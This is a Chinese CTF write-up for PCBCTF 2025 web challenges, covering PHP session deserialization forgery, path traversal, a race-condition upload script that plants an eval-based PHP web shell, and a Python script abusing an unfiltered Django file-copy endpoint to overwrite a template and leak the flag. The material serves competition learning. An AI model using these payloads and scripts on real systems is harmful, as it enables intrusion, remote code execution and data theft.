---
title: "PCBCTF2025 Web 解出汇总"
description: "PCBCTF 2025 Web方向比赛WP，整理解题思路、关键利用点和赛后复盘记录。"
pubDate: "2026-01-01"
updatedDate: "2026-01-01"
tags: ["CTF", "Web安全", "WP"]
cover: auto
coverAlt: "PCBCTF2025 Web 解出汇总 的文章封面"
draft: false
---
## ez_php

TzoxMjoiU2Vzc2lvblxVc2VyIjoxOntzOjIyOiIAU2Vzc2lvblxVc2VyAHVzZXJuYW1lIjtzOjU6ImFkYWRtaW5taW4iO30=

SESIION php反序列化，双写admin绕过

dash存在路径遍历，发现.php被禁用

文件上传功能，tar文件上传shell.php失败，上传正常图像也失败，直接上传头像也失败，然后写笔记页面上传笔记也失败

?filename=flag.php/
/绕过.php

## uplssse

抓包发现需要admin，改一下base64的SSESION

O:4:"User":4:{s:8:"username";s:5:"admin";s:8:"password";s:3:"123";s:10:"isLoggedIn";b:1;s:8:"is_admin";i:1;}

Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czoxMDoiaXNMb2dnZWRJbiI7YjoxO3M6ODoiaXNfYWRtaW4iO2k6MTt9

条件竞争

```
#!/bin/bash
request(){
    curl -fs "http://192.168.18.26:25002/tmp/cmd.php"
}

upload(){
    curl -fs -X POST \
    -H "Content-Type: multipart/form-data" \
    -F "file=cmd.php;type=image/jpeg" \
    -F "upload="上传文件" \
    -H "cookie: user_auth=Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czoxMDoiaXNMb2dnZWRJbiI7YjoxO3M6ODoiaXNfYWRtaW4iO2k6MTt9" \
    http://192.168.18.26:25002/upload.php
}

a(){
    while true; do
        upload & sleep 0.05
    done
}

b(){
    while true; do
        request & sleep 0.02
    done
}

a & b &
wait

<?php file_put_contents('shell.php', '<?php @eval($_POST[a]);?>'); echo 'Race Success\!';?>
```
## Django

pickle反序列化
```
def copy_file(request):
    if request.method == "POST":
        src = request.POST.get('src', '')
        dst = request.POST.get('dst', '')
        if not src or not dst:
            return json_error('Source and destination required')
        try:
            if not os.path.exists(src):
                return json_error('Source file not found')
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            content = read_file_bytes(src)
            with open(dst, 'wb') as dest_file:
                dest_file.write(content)
            return json_success('File copied', src=src, dst=dst)
        except Exception as e:
            return json_error(str(e))
    
    return render(request, 'copy.html')
```
这里存在一个复制文件的功能，且没有过滤

尝试将/flag复制到模板上利用Django渲染成功得解
```
import requests
TARGET_URL = "http://192.168.18.27:25003" 
TARGET_TEMPLATE = "templates/copy.html" 
SOURCE_FILE = "/flag"
def exploit_template_overwrite():
    s = requests.Session()
    print(f"[*] 目标: {TARGET_URL}")
    print("[*] 策略: 尝试覆盖 Django 模板文件 (Template Overwrite)")
    print(f"[-] 正在尝试复制: {SOURCE_FILE} -> {TARGET_TEMPLATE}")
    try:
        r = s.post(f"{TARGET_URL}/copy/", data={
            'src': SOURCE_FILE,
            'dst': TARGET_TEMPLATE
        })
        if "success" in r.text:
            print(f"[+] 服务器报告复制成功!")
            print("[*] 正在访问 /copy/ 查看被篡改的页面...")
            
            # 2. 访问页面触发渲染
            # 这一步 Django 会读取 templates/copy.html，也就是 flag 的内容
            trigger_url = f"{TARGET_URL}/copy/"
            resp = s.get(trigger_url)
            
            if resp.status_code == 200:
                content = resp.text.strip()
                print("\n" + "="*50)
                print("[SUCCESS] 页面内容如下 (包含Flag?):")
                print(content)
                print("="*50 + "\n")
                
                if "flag{" in content.lower():
                    print("[!!!] 恭喜！成功获取 Flag！")
            else:
                print(f"[-] 访问页面失败: {resp.status_code}")
        else:
            print(f"[-] 复制失败: {r.text}")
            if "Permission denied" in r.text:
                print("    -> 权限不足，无法写入 templates 目录。")
            elif "not found" in r.text:
                print("    -> 源文件未找到，可能 flag 路径不对。")

    except Exception as e:
        print(f"[-] 发生异常: {e}")

if __name__ == "__main__":
    exploit_template_overwrite()
```
